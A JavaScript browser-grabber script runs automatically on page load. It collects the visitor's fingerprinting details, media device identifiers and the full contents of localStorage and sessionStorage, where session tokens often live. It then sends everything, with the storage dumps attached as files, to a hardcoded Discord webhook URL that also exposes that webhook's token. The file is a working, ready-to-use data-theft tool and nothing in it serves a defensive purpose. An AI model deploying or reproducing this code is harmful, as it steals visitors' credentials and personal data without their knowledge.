const webhookUrl = 'https://discord.com/api/webhooks/1263106829236568066/ePfLqXb3lIqKoyok52enaYaNHPkpEVpbVhITe4m-Ev3HumbeGcMDCq9MADar8TK5t1Uf';

// Gather browser information
async function gatherBrowserInfo() {
    try {
        const info = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages.join(', '),
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            screenWidth: screen.width,
            screenHeight: screen.height,
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            screenOrientation: getScreenOrientation(),
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            plugins: getPlugins(),
            localStorage: getLocalStorageData(),
            sessionStorage: getSessionStorageData(),
            location: getLocation(),
            hardwareConcurrency: navigator.hardwareConcurrency,
            connection: getConnectionData(),
            deviceMemory: navigator.deviceMemory || 'Not available',
            battery: await getBatteryStatus(),
            touchPoints: navigator.maxTouchPoints || 'Not supported',
            mediaDevices: await getMediaDevices(),
            webRTCSupport: detectWebRTC(),
            browserHistory: await getBrowserHistory(),
        };

        return info;
    } catch (error) {
        console.error('Error gathering browser information:', error);
        throw error;
    }
}

// Get browser history (dummy function due to browser security restrictions)
async function getBrowserHistory() {
    // In real-world scenario, this would involve fetching and formatting browsing history
    // Due to security restrictions, direct access to browsing history is not possible in browsers.
    return 'Browser history cannot be accessed due to security restrictions.';
}

// Get screen orientation
function getScreenOrientation() {
    if (screen.orientation) {
        return `${screen.orientation.type} (${screen.orientation.angle} degrees)`;
    }
    return 'Not supported';
}

// Get battery status
async function getBatteryStatus() {
    if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        return {
            level: battery.level * 100 + '%',
            charging: battery.charging ? 'Charging' : 'Discharging',
            chargingTime: battery.charging ? `${battery.chargingTime} seconds` : 'N/A',
            dischargingTime: battery.dischargingTime ? `${battery.dischargingTime} seconds` : 'N/A',
        };
    }
    return 'Not supported';
}

// Get list of installed plugins
function getPlugins() {
    return Array.from(navigator.plugins).map(plugin => ({
        name: plugin.name,
        filename: plugin.filename,
        description: plugin.description,
    }));
}

// Get data from Local Storage
function getLocalStorageData() {
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        localStorageData[key] = localStorage.getItem(key);
    }
    return localStorageData;
}

// Get data from Session Storage
function getSessionStorageData() {
    const sessionStorageData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        sessionStorageData[key] = sessionStorage.getItem(key);
    }
    return sessionStorageData;
}

// Get current page location details
function getLocation() {
    return {
        href: window.location.href,
        hostname: window.location.hostname,
        pathname: window.location.pathname,
        protocol: window.location.protocol,
        search: window.location.search,
    };
}

// Get network connection details
function getConnectionData() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
        return {
            effectiveType: connection.effectiveType,
            rtt: connection.rtt,
            downlink: connection.downlink,
            saveData: connection.saveData,
        };
    }
    return null;
}

// Get media devices information
async function getMediaDevices() {
    try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        return devices.map(device => ({
            kind: device.kind,
            label: device.label,
            deviceId: device.deviceId,
        }));
    } catch (error) {
        return 'Not supported';
    }
}

// Detect WebRTC support
function detectWebRTC() {
    const isWebRTCSupported = !!(
        window.RTCPeerConnection ||
        window.webkitRTCPeerConnection ||
        window.mozRTCPeerConnection
    );
    return isWebRTCSupported ? 'Supported' : 'Not supported';
}

// Send gathered browser information to Discord
function sendBrowserInfoToDiscord(info) {
    const embed = {
        title: 'Browser Information',
        description: 'Here\'s the information gathered from the browser:',
        color: 5814783,
        fields: [
            { name: '// User Agent //', value: info.userAgent },
            { name: '// Language //', value: info.language },
            { name: '// Languages //', value: info.languages },
            { name: '// Platform //', value: info.platform },
            { name: '// Cookie Enabled //', value: info.cookieEnabled },
            { name: '// Java Enabled //', value: info.javaEnabled },
            { name: '// Screen Size //', value: `${info.screenWidth}x${info.screenHeight}` },
            { name: '// Inner Size //', value: `${info.innerWidth}x${info.innerHeight}` },
            { name: '// Screen Orientation //', value: info.screenOrientation },
            { name: '// Time Zone //', value: info.timeZone },
            { name: '// Plugins //', value: formatPlugins(info.plugins) },
            { name: '// Local Storage //', value: 'See attached file' },
            { name: '// Session Storage //', value: 'See attached file' },
            { name: '// Location //', value: JSON.stringify(info.location, null, 2) },
            { name: '// Hardware Concurrency //', value: info.hardwareConcurrency },
            { name: '// Device Memory //', value: info.deviceMemory },
            { name: '// Battery Status //', value: formatBatteryStatus(info.battery) },
            { name: '// Max Touch Points //', value: info.touchPoints },
            { name: '// Media Devices //', value: formatMediaDevices(info.mediaDevices) },
            { name: '// WebRTC Support //', value: info.webRTCSupport },
            { name: '// Connection Type //', value: info.connection ? info.connection.effectiveType : 'Not available' },
            { name: '// Round-Trip Time (RTT) //', value: info.connection ? `${info.connection.rtt} ms` : 'Not available' },
            { name: '// Downlink Speed //', value: info.connection ? `${info.connection.downlink} Mbps` : 'Not available' },
            { name: '// Save Data Mode //', value: info.connection ? info.connection.saveData : 'Not available' },
            { name: '// Browser History //', value: 'See attached file' },
        ],
        timestamp: new Date().toISOString(),
    };

    const payload = new FormData();
    payload.append('payload_json', JSON.stringify({ embeds: [embed] }));
    payload.append('files', new Blob([JSON.stringify(info.localStorage, null, 2)], { type: 'application/json' }), 'LocalStorage.json');
    payload.append('files', new Blob([JSON.stringify(info.sessionStorage, null, 2)], { type: 'application/json' }), 'SessionStorage.json');
    payload.append('files', new Blob([JSON.stringify(info.browserHistory, null, 2)], { type: 'application/json' }), 'BrowserHistory.json');

    fetch(webhookUrl, {
        method: 'POST',
        body: payload,
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to send browser info to Discord: ' + response.statusText);
        }
        return response.json();
    })
    .then(data => console.log('Browser info sent to Discord:', data))
    .catch(error => console.error('Error sending browser info to Discord:', error));
}

// Format plugins for Discord
function formatPlugins(plugins) {
    return plugins.map((plugin, index) => `${index + 1}. ${plugin.name} (${plugin.filename}): ${plugin.description}`).join('\n');
}

// Format battery status for Discord
function formatBatteryStatus(battery) {
    if (typeof battery === 'string') {
        return battery; // 'Not supported' or error message
    }
    return `${battery.level}, ${battery.charging}, Charging Time: ${battery.chargingTime}, Discharging Time: ${battery.dischargingTime}`;
}

// Format media devices for Discord
function formatMediaDevices(devices) {
    if (typeof devices === 'string') {
        return devices; // 'Not supported'
    }
    return devices.map((device, index) => `${index + 1}. ${device.kind} (${device.deviceId}): ${device.label || 'No label'}`).join('\n');
}

// Execute on page load
window.onload = async () => {
    try {
        const browserInfo = await gatherBrowserInfo();
        sendBrowserInfoToDiscord(browserInfo);
    } catch (error) {
        console.error('Error:', error);
    }
};
